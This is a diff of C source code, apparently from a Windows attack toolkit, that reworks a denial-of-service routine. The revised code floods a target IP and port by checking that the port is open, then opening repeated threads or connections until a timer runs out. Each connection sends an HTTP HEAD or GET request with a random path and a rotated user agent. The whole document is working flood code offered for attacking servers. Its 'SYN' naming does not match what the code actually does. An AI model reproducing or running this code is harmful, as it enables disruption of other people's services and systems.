@@ -11,18 +11,19 @@
 #include "Message.h"
 #include "AttackDOS.h"
 #include "PortScan.h"
+#include "ToolsHTTP.h"
 
-
-int FullTcpDosConnection(SOCKADDR_IN ServerAddr, char* ipAddress, UINT bufferSize) {
+int TCPSynDosConnection(SOCKADDR_IN ServerAddr, char* ipAddress) {
     SOCKET SendingSocket;
-    char* payloadBuffer = NULL;
 
-    //SendingSocket = socket(AF_INET, SOCK_DGRAM , IPPROTO_TCP);
     SendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (SendingSocket == INVALID_SOCKET) {
         PrintSocketError("Client: socket() failed! Error code");
         return FALSE;
     }
+
+    const char flag = TRUE;
+    setsockopt(SendingSocket, SOL_SOCKET, SO_KEEPALIVE, &flag, sizeof(flag));
     int iResult = connect(SendingSocket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr));
     if (iResult != 0) {
         PrintSocketError("Connect() failed! Error code");
@@ -30,44 +31,59 @@ int FullTcpDosConnection(SOCKADDR_IN ServerAddr, char* ipAddress, UINT bufferSiz
         return FALSE;
     }
 
-    if (!CopyRandBufferAlloc(&payloadBuffer, bufferSize))
-        return FALSE;
+    char payload[1024];
+    char method[5];
+
+    //Randomly mix between head and get requests.
+    if ((rand() % 2) == 0) {
+        strcpy_s(method, 5, "HEAD");
+    } else {
+        strcpy_s(method, 5, "GET");
+    }
+
+    int random = rand();
+    sprintf_s(payload, 1024, "%s /%i HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "User-Agent: %s\r\n"
+        "Connection: Keep-Alive\r\n"
+        // "Content-Length: "
+        , method, random, ipAddress, userAgentList[rand() % 5]);
 
 
     // Send an initial buffer
-    iResult = send(SendingSocket, payloadBuffer, (int)bufferSize, 0);
+    iResult = send(SendingSocket, payload, (int)sizeof(payload), 0);
     if (iResult == SOCKET_ERROR) {
         PrintSocketError("Send failed with error");
-        PrintSocketError("send failed with error");
+        printf("send failed with error: %d\n", WSAGetLastError());
         closesocket(SendingSocket);
         return FALSE;
     }
-    //printf("[i] Bytes Sent: %ld\n", iResult); // connection close 
+    printf("[i] Bytes Sent: %ld\n", iResult); // connection close 
     closesocket(SendingSocket);
-    return iResult;
+    return TRUE;
 }
 
-DWORD WINAPI ThreadTcpFullDosConnection(LPVOID lpParam) {
+DWORD WINAPI ThreadTcpSynDosConnection(LPVOID lpParam) {
     PTHREAD_STRUCT_HTTP_DOS pThreadData = (PTHREAD_STRUCT_HTTP_DOS)lpParam;
     SOCKADDR_IN ServerAddr = pThreadData->ServerAddr;
     char* ipAddress = pThreadData->ipAddress;
-    UINT bufferSize = pThreadData->bufferSize;
-    return FullTcpDosConnection(ServerAddr, ipAddress, bufferSize);
+    return TCPSynDosConnection(ServerAddr, ipAddress);
 }
 
-BOOL AttackFloodFullTcp(char* ipAddress, int port, int waitTime, UINT bufferSize, BOOL isMultith) {
+BOOL AttackFloodTcpSyn(char* ipAddress, int port, int waitTime, UINT bufferSize, BOOL isMultith) {
+    // bufferSize <- ???
+
     clock_t startTime = clock();
     clock_t currentTime = clock();
+
     SOCKADDR_IN ssin = InitSockAddr(ipAddress, port);
-    THREAD_STRUCT_HTTP_DOS threadStructHttpDos = {
+
+
+    THREAD_STRUCT_HTTP_DOS threadStructTcpSynDos = {
         .ServerAddr = ssin,
-
-        .ipAddress = ipAddress,
-        .bufferSize = bufferSize
+        .ipAddress = ipAddress
     };
-    int sizeDataSize = 0;
-
-    printf("[-] Attack Flooding with FULL TCP connection\n");
+    printf("[-] Attack Flooding with TCP SYN\n");
 
     if (!scanPortOpenTCP(ipAddress, port, NULL)) {
         printf("[X] Port %i is CLOSE !\n", port);
@@ -77,21 +93,17 @@ BOOL AttackFloodFullTcp(char* ipAddress, int port, int waitTime, UINT bufferSize
         printf("[+] Port %i is OPEN !\n", port);
 
     for (int i = 0; startTime + waitTime > currentTime; i++) {
-        DWORD ThreadId = 0;
         if (isMultith) {
-            // ERROR ???
-
-            HANDLE Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FullTcpDosConnection, &ThreadTcpFullDosConnection, 0, &ThreadId);
+            DWORD ThreadId = 0;
+            HANDLE Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TCPSynDosConnection, &threadStructTcpSynDos, 0, &ThreadId);
             if (Thread != NULL) {
-                PrintMsgError2("Create Thread with id: %lu\n", ThreadId);
+                printf("Create Thread with id: %lu\n", ThreadId);
                 CloseHandle(Thread);
             }
         } else {
-            sizeDataSize += FullTcpDosConnection(ssin, ipAddress, bufferSize);
-            printf("[i] Bytes Sent: %ld kb\r", sizeDataSize / 1000);
+            TCPSynDosConnection(ssin, ipAddress);
         }
         currentTime = clock();
     }
-    printf("\n[!] Attack done !\n");
-    return sizeDataSize;
+    return TRUE;
 }
